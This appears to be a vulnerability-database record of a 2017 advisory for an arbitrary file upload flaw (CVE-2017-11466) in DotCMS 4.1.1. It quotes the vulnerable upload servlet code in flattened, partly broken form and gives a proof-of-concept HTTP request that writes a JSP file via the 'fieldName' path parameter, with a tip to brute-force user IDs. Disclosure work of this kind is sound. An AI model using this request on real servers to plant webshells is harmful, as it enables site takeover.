{
    "text": "vul_name : DotCMS 4.1.1 Shell Upload ， vul_cve : CVE-2017-11466 ， vul_poc : = ， Advisory : DotCMS /servlets/ajax_file_upload Arbitrary File Upload Vulnerability ， Author : M3 @ pandas From DBAppSecurity Security Lab ， Email : xiaotian.wang @ dbappsecurity.com.cn ， Affected Version : 4.1.1 the latest version ， Vulnerability Description ， Recetly , I found an Arbitrary File Upload Vulnerability in 'DotCMS' program , DotCMS is widely used in many companies. ， Vulnerable cgi : /dotcms_4.1.1_999999.jar ! /com/dotmarketing/servlets/AjaxFileUploadServlet.class :  ， private void doFileUpload ( HttpSession session , HttpServletRequest request , HttpServletResponse response )  ， throws IOException ， { ， String fieldName = null ;  ， AjaxFileUploadListener listener = null ;  ， { ， String fileName = \" ;  ， listener = new AjaxFileUploadListener ( request.getContentLength (  )  ;  ， FileItemFactory factory = new MonitoredDiskFileItemFactory ( listener )  ;  ， fieldName = request.getParameter ( \"fieldName\" )  ;  ， Enumeration params = request.getParameterNames (  )  ;  ， session.setAttribute ( \"FILE_UPLOAD_STATS_\" + fieldName , listener.getFileUploadStats (  )  ;  ， ServletFileUpload upload = new ServletFileUpload ( factory )  ;  ， List items = upload.parseRequest ( request )  ;  ， boolean hasError = false ;  ， this.isEmptyFile = false ;  ， String userId = null ;  ， { ， userId = ( String ) session.getAttribute ( \"USER_ID\" )  ;  ， User user = UserLocalManagerUtil.getUserById ( userId )  ;  ， throw new Exception ( \"Could not upload File. Invalid User\" )  ;  ， } ， } ， { ， throw new Exception ( \"Could not upload File. Invalid User\" )  ;  ， } ， { ， FileItem fileItem = ( FileItem ) i.next (  )  ;  ， { ， this.isEmptyFile = true ;  ， } ， fileName = fileItem.getName (  ) .substring ( fileItem ， .getName (  ) .lastIndexOf ( File.separator ) + 1 )  ;  ， } else { ， fileName = fileItem.getName (  )  ;  ， } ， fileName = ContentletUtil.sanitizeFileName ( fileName )  ;  ， File tempUserFolder = new File ( APILocator.getFileAssetAPI (  ) .getRealAssetPathTmpBinary (  ) + File.separator + userId + File.separator + fieldName )  ;  ， throw new IOException ( \"Invalid fileName or Path\" )  ;  ， } ， tempUserFolder.mkdirs (  )  ;  ， } ， File dest = new File ( tempUserFolder.getAbsolutePath (  ) + File.separator + fileName )  ;  ， dest.delete (  )  ;  ， } ， fileItem.write ( dest )  ;  ， fileItem.delete (  )  ;  ， } ， } ， fileName = \" ;  ， } ， sendCompleteResponse ( response , null )  ;  ， } else { ， sendCompleteResponse ( response , \"Could not process uploaded file. Please see log for details.\" )  ;  ， } ， } ， catch ( Exception e )  ， { ， listener.error ( \"error\" )  ;  ， session.setAttribute ( \"FILE_UPLOAD_STATS_\" + fieldName , listener.getFileUploadStats (  )  ;  ， sendCompleteResponse ( response , e.getMessage (  )  ;  ， e.printStackTrace (  )  ;  ， } ， } ， tempUserFolder can be controlled through paramter 'fieldName' , the upload data is not filtered and the uploaded path can be user-definedi1/4so attacker with the administrator authority can upload evil jsp webshell file to control the whole web site or even the web server. ， POC EXP ， 1. Login as administrator ， 2. POST /servlets/ajax_file_upload?fieldName=./ HTTP/1.1 ， Host : 192.168.1.204 : 8080 ， Accept-Encoding : gzip , deflate ， Content-Type : multipart/form-data ; boundary=-1234995635 ， Cookie : your own cookies ， Connection : close ， Content-Length : 138 ， -1234995635 ， Content-Disposition : form-data ; name=\"xx\" ; filename=\"test.jsp\" ， <% out.print ( \"test_for_fun ! \" )  ; %> ， -1234995635- ， 3. shell is :  ， Attension : In some other cases : 'filedName=' , then shell will be in 'assets/tmp_upload/dotcms.org.1/' like this :  , 'dotcms.org.1' is your userid , even if you do not know your userid , you can bruteforce the number behind ' dotcms.org.' .",
    "time": "2017-07-19 / 2017-07-21"
}